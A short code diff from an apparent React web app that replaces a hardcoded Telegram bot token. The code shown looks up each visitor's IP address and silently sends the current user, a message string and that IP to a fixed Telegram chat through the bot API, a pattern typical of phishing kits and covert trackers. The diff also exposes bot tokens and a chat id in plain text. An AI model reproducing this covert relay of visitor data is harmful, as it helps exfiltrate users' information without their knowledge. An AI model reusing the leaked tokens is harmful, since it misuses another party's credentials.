@@ -13,7 +13,7 @@ import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
 let ip = 'Not Found';
 let currentUser = 'unknown';
 let time = 0;
-const tgtoken = 'bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA';
+const tgtoken = 'bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU';
 const chat_id = "-1001166751237"
 export async function sendUpdate(msg) {
   if (time < Date.now() - 3000) {
@@ -23,6 +23,7 @@ export async function sendUpdate(msg) {
         .then(result => result.json())
         .then((output) => {
           ip = output;
+          
           const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip.ipAddress}`)}`;
           fetch(url)
         }).catch(err => console.error(err));
